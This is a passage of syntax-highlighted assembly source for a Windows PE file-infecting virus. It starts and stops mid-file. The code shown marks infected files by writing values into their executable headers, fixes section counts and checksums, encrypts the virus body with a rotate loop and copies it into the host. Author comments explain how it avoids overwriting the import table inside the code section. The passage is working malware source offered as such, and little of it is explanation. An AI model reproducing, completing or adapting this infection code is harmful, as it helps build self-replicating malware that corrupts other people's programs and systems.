       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">n</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;n</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitCopro</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">n</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;load the root numbers</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">m</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">n</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">m</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fmul</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">                              </span><span class="sc1">;M*M</span><span class="sc0">
       </span><span class="sc7">fincstp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fmul</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">                              </span><span class="sc1">;N*N</span><span class="sc0">
       </span><span class="sc7">fdecstp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fadd</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">                              </span><span class="sc1">;M*M + N*N</span><span class="sc0">
       </span><span class="sc7">fist</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;store it to a</span><span class="sc0">
       </span><span class="sc7">fsub</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fsub</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fabs</span><span class="sc0">                                        </span><span class="sc1">;|M*M - N*N|</span><span class="sc0">
       </span><span class="sc7">fist</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc10">c</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;store it to c</span><span class="sc0">
       </span><span class="sc7">fincstp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fincstp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fmul</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fimul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">two</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;2*M*N</span><span class="sc0">
       </span><span class="sc7">fist</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">b</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;store it to b</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RestoreCopro</span><span class="sc0">                           </span><span class="sc1">;Now a^2 = b^2 + c^2</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;mark infection!</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_oeminfo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">b</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MajorImageVersion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc10">c</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MinorImageVersion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofheaders</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;rearrange size of headers</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SizeOfHeaders</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_INCREASE_LAST</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_need_to_increase</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NumberOfSections</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_need_to_increase</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">CHECKSUM</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_CheckSum</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_checksum</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checksumfile</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_checksum</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_CheckSum</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_checksum</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_CheckSum</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">headersum</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_CheckSum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_checksum</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;our internal encryptor</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">EncryptedArea</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">end2</span><span class="sc4">-</span><span class="sc5">EncryptedArea</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">EncryptLoop</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jp</span><span class="sc0"> </span><span class="sc5">_parity</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_encrypt</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_parity</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">do_encrypt</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">EncryptLoop</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infection_succesfull</span><span class="sc0">                    </span><span class="sc1">;success!!! ;-)</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">m</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">n</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">a</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">b</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc10">c</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">two</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">move_virus_size</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;this moves as many bytes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">;as the virus size is..</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;I found out today a very important thing... Some of the pe files inside</span><span class="sc0">
</span><span class="sc1">;the windows directory have a certain particularity that requires special</span><span class="sc0">
</span><span class="sc1">;care... That is some of the directories present in the DataDirectory have</span><span class="sc0">
</span><span class="sc1">;a RVA that falls inside the code section. This is the case for the</span><span class="sc0">
</span><span class="sc1">;Import Address Table (IAT), which for some file occurs at the beginning of</span><span class="sc0">
</span><span class="sc1">;the code section. If the virus places itself over that area, than, first of</span><span class="sc0">
</span><span class="sc1">;all the running of the original file will be faulted, and second of all, a</span><span class="sc0">
</span><span class="sc1">;part of the virus will be overwritten by the system at load and an error</span><span class="sc0">
</span><span class="sc1">;will occure for sure. In this situation the virus will check if any of</span><span class="sc0">
</span><span class="sc1">;the directories intersects it and if so, will try to get another random</span><span class="sc0">
</span><span class="sc1">;place. If it is not possible, the virus will go at end.</span><span class="sc0">
</span><span class="sc5">check_intersection</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;save registers!</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionraw</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberofrva</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;how many directories?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;index in directories.</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">check_directories</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;save all again!</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.edx.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; x   = X (esi)</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_next_dir</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; x+y = Y (eax)</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.edx.DD_Size</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; a   = A (edi)</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">; a+b = B (ebx)</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;We have to check if the interval (X,Y) intersects interval (A,B)</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; X&lt;A?</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">YYY1</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">XXX1</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">YYY1</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;Y&lt;A?</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ok_next_dir</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intersect</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">XXX1</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;X&gt;B?</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Intersect</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ok_next_dir</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">check_directories</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Intersect</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
